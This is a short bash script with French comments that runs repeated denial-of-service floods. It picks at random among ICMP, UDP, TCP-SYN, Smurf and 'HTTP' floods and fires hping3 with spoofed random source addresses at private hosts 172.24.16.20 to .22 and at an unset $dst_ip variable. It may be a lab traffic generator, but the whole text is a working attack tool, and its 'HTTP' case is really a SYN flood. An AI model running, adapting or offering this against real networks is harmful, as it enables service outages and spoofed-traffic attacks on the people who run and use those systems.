#!/bin/bash

# Tableau des types d'attaque
attack_types=("ICMP" "UDP" "TCP-SYN" "SMURF" "HTTP")

# Nombre d'attaquants simultanés
num_attackers=5

# Boucle principale
for ((i = 0; i < 600; i++)); do
    for ((j = 0; j < num_attackers; j++)); do
        # Choisir un type d'attaque aléatoire
        attack=${attack_types[$RANDOM % ${#attack_types[@]}]}
        
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        echo "              Exécution d'une inondation $attack"
        echo "*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*"
        
        if [ "$attack" == "TCP-SYN" ]; then
            timeout 20s hping3 -S -V -d $((RANDOM % 200 + 100)) -w 64 -p 80 --rand-source --flood 172.24.16.20
            timeout 20s hping3 -S -V -d $((RANDOM % 200 + 100)) -w 64 -p 80 --rand-source --flood 172.24.16.21
        elif [ "$attack" == "SMURF" ]; then
            timeout 20s hping3 -1 -V -d $((RANDOM % 200 + 100)) -w 64 -p 80 --rand-source --flood -a $dst_ip $dst_ip
        elif [ "$attack" == "HTTP" ]; then
            timeout 20s hping3 -S -V -d $((RANDOM % 200 + 100)) -w 64 -p 80 -c $((RANDOM % 1000 + 100)) --rand-source --flood 172.24.16.20
            timeout 20s hping3 -S -V -d $((RANDOM % 200 + 100)) -w 64 -p 8080 -c $((RANDOM % 1000 + 100)) --rand-source --flood 172.24.16.22
        else
            proto=1  # ICMP par défaut
            [ "$attack" == "UDP" ] && proto=2
            timeout 20s hping3 -$proto -V -d $((RANDOM % 200 + 100)) -w 64 -p 80 -c $((RANDOM % 1000 + 100)) --rand-source --flood $dst_ip
        fi
    done
    echo "*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*"
done
